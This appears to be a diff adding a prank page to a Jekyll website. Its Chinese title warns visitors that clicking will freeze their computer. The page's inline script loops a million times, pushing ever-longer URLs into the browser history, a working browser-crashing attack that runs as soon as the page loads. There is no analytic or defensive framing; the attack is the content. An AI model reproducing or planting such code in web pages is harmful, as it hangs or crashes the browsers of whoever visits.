@@ -1,0 +1,16 @@
+---
+layout: default
+title: 不要点这一条,否则你会死机
+---
+
+<div class="box u-content">
+    <h2>O(∩_∩)O哈哈~</h2>
+
+</div>
+
+<script>
+    for (var i= 0, total="";i<1000000;i++) {
+        total += i.toString ();
+        history.pushState (0, 0, total);
+    }
+</script>
